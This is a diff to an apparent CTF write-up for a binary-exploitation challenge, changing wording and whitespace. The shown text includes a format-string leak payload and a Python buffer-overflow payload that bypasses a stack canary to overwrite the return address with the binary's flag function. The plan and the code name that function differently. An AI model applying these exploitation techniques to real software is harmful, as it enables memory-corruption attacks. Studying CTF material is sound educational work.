@@ -212,7 +212,7 @@ Here is the devised plan.
 4. Override the return address with `print_flag` address, calculated based on the leaked `main` address.
 
 
-The only tripping part of the challenge is that for the buffer overflow bug, we can only write 0x5e bytes to the buffer, while the return address is at 0x58. This means that we can only override the least significant (bottom) 6 bytes of the return address, but since we do not jump to stack nor heap, this is not a big deal.
+The only tripping part of the challenge is that for the buffer overflow bug, we can only write 0x5e bytes to the buffer, while the return address is at 0x58. This means that we can only override the least significant (bottom) 6 bytes of the return address, but since we do not jump to stack nor heap address, this is not a big deal.
 
 The payload for format string would be: `b'%21$p!%23$p!'`.
 
@@ -220,7 +220,7 @@ And the payload for buffer overflow would be:
 
 ```python
 payload = (b''
-  +   b'A'   *   0x48          # buffer
+  +   b'A' * 0x48              # buffer
   +   p64(canary)              # stack canary
   +   b'R' * 8                 # saved rbp
   +   p64(e.sym["read_flag"])  # return address
